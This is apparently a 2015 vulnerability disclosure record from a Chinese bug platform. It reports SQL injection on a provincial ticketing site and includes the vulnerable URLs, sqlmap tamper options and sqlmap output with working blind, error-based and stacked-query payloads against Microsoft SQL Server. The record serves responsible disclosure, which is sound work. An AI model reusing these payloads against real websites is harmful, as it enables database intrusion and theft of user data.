wybug_title: 某省票务网存在多处SQL注入漏洞百万数据泄漏
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-07-01：	细节已通知厂商并且等待厂商处理中									2015-07-03：	厂商已经确认，细节仅向厂商公开									2015-07-13：	细节向核心白帽子及相关领域专家公开									2015-07-23：	细节向普通白帽子公开									2015-08-02：	细节向实习白帽子公开									2015-08-17：	细节向公众公开  简要描述： 有路人甲提交过的没有修复，还有其他可以注入的！~~ 详细说明：  一、1、注入点
http://www.gxpiao.com/xianlusearch.html?city=%e8%b4%ba%e5%b7%9e%e5%b8%82
2、直接上sqlmap测试加参数 --tamper between.py,randomcase.py,space2comment.py --threads 10 --dbms "Microsoft SQL Server 2008"











3、未修复的--tamper between.py,randomcase.py,space2comment.py --threads 10 --dbms "Microsoft SQL Server 2008"
http://www.gxpiao.com/Movie_page1.aspx?dyyid=DYYLB141029-0001

sqlmap identified the following injection points with a total of 25 HTTP(s) requests:---Place: GETParameter: dyyid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: dyyid=DYYLB141029-0001' AND 1970=1970 AND 'RxDH'='RxDH    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: dyyid=DYYLB141029-0001'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: dyyid=DYYLB141029-0001' WAITFOR DELAY '0:0:5'-----[18:35:28] [WARNING] changes made by tampering scripts are not included in shown payload content(s)[18:35:28] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windowsweb application technology: ASP.NET, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008

http://www.gxpiao.com/Movie_page2.aspx?dybm=DYLB150408-0001

sqlmap identified the following injection points with a total of 42 HTTP(s) requests:---Place: GETParameter: dybm    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: dybm=DYLB150408-0001' AND 1187=CONVERT(INT,(SELECT CHAR(113)+CHAR(110)+CHAR(97)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (1187=1187) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(117)+CHAR(98)+CHAR(113))) AND 'gMix'='gMix    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: dybm=DYLB150408-0001'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: dybm=DYLB150408-0001' WAITFOR DELAY '0:0:5'-----[18:37:55] [WARNING] changes made by tampering scripts are not included in shown payload content(s)[18:37:55] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windowsweb application technology: ASP.NET, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008

wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-07-03 15:35 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给广西分中心，由其后续协调网站管理单位处置。 最新状态： 暂无
